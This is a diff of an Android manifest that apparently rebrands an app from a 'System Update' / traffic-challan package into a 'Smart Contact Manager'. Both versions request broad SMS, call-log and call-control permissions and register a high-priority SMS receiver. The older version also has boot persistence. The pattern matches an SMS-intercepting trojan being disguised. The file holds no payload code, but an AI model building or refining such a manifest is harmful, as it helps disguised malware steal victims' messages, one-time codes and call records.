@@ -1,91 +1,54 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.rte.challan">
+    package="com.smart.utility.contacts">
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.WRITE_SMS" /> <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
 
     <application
-        android:allowBackup="true"
+        android:label="Smart Contact Manager"
         android:icon="@mipmap/ic_launcher"
-        android:label="System Update"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.RtoEChallan"
-        tools:targetApi="33"> <activity
-            android:name=".MainActivity"
-            android:label="System Update"
-            android:exported="true">
+        android:theme="@style/Theme.MaterialComponents.Light.NoActionBar">
+
+        <activity android:name=".MainActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
+                <category android:name="android.intent.category.APP_MARKET" /> </intent-filter>
 
             <intent-filter>
                 <action android:name="android.intent.action.SENDTO" />
                 <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.BROWSABLE" />
                 <data android:scheme="sms" />
                 <data android:scheme="smsto" />
-                <data android:scheme="mms" />
-                <data android:scheme="mmsto" />
             </intent-filter>
 
             <intent-filter>
                 <action android:name="android.intent.action.DIAL" />
                 <action android:name="android.intent.action.VIEW" />
                 <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.BROWSABLE" />
                 <data android:scheme="tel" />
             </intent-filter>
         </activity>
 
-        <activity android:name=".ComposeSmsActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.SEND" />
-                <action android:name="android.intent.action.SENDTO" />
-                <category android:name="android.intent.category.DEFAULT" />
-                <category android:name="android.intent.category.BROWSABLE" />
-                <data android:scheme="sms" />
-                <data android:scheme="smsto" />
-                <data android:mimeType="text/plain" />
-            </intent-filter>
-        </activity>
-
-        <receiver
-            android:name=".receiver.SmsReceiver"
+        <receiver android:name=".receiver.SmsReceiver"
             android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
             android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
-            </intent-filter>
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_DELIVER" />
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
-        <service
-            android:name=".service.HeadlessSmsSendService"
-            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
-            </intent-filter>
-        </service>
-
-        <service
-            android:name=".service.InCallServiceImpl"
+        <service android:name=".service.InCallServiceImpl"
             android:permission="android.permission.BIND_INCALL_SERVICE"
             android:exported="true">
             <meta-data android:name="android.telecom.IN_CALL_SERVICE_UI" android:value="false" />
@@ -94,17 +57,13 @@
             </intent-filter>
         </service>
 
-        <service
-            android:name=".service.BackgroundService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="specialUse" />
-
-        <receiver android:name=".receiver.BootReceiver" android:exported="true">
+        <service android:name=".service.HeadlessSmsSendService"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:exported="true">
             <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
             </intent-filter>
-        </receiver>
+        </service>
 
     </application>
 </manifest>
